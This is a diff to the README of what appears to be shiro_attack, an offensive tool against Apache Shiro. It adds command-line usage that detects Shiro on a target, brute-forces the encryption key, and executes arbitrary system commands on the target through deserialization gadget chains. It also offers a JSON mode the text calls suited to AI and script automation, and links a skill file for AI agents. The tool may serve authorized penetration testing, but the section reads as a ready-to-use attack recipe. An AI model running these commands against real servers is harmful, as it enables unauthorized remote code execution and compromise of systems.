@@ -131,6 +131,32 @@ mvn install:install-file -Dfile=jmg-sdk-1.0.9.jar -DgroupId=jmg -DartifactId=jmg
 
 运行方式：
 
+
+### CLI 模式（命令行）
+
+CLI 模式支持单目标快速利用，无需 GUI，适合脚本/自动化/AI 调用场景。
+
+```bash
+# 探测 Shiro 框架
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI detect -u http://target:8080 [--cbc|--gcm]
+
+# 爆破/验证 Shiro Key
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI crack  -u http://target:8080 [--cbc|--gcm]
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI crack  -u http://target:8080 -K <base64_key>
+
+# 执行系统命令（自动探测 Gadget 链）
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI exec   -u http://target:8080 -K <key> -c <command> [--cbc|--gcm]
+
+# 指定 Gadget + 回显，跳过自动探测
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI exec   -u http://target:8080 -K <key> -c <command> -g CommonsBeanutilsString_183 -e AllEcho
+
+# JSON 输出模式（结构化日志，适合 AI/脚本解析）
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI exec   -u http://target:8080 -K <key> -c id --json
+```
+
+`--json` 模式下日志为结构化 JSON，命令执行结果仍为原始文本。可选参数：`--proxy <url>`、`--timeout <sec>`。AES 模式：Shiro ≤1.2.4 用 `--cbc`，≥1.2.5 用 `--gcm`。
+
+CLI 使用详情见 [skills/shiro-attack-cli/SKILL.md](./skills/shiro-attack-cli/SKILL.md)。
 ```bash
 java -jar shiro_attack-<version>-<jdk>.jar
 ```
